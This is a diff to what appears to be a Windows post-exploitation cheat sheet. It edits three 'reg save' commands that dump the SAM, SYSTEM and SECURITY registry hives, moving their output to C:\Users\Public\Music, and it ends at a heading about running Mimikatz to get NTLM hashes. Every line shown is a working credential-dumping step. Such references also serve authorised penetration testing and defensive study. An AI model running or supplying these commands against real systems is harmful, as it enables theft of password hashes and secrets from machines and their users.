@@ -393,15 +393,15 @@ Get-WmiObject -Class Win32_OperatingSystem | select Description
 ### Dumping SAM, SYSTEM, and SECURITY,
 
 ```cmd
-reg save hklm\sam C:\sam
+reg save hklm\sam C:\Users\Public\Music\sam
 ```
 
 ```cmd
-reg save hklm\system C:\system
+reg save hklm\system C:\Users\Public\Music\system
 ```
 
 ```cmd
-reg save hklm\security C:\security
+reg save hklm\security C:\Users\Public\Music\security
 ```
 
 ### Running MimiKatz to get NTLM Hash
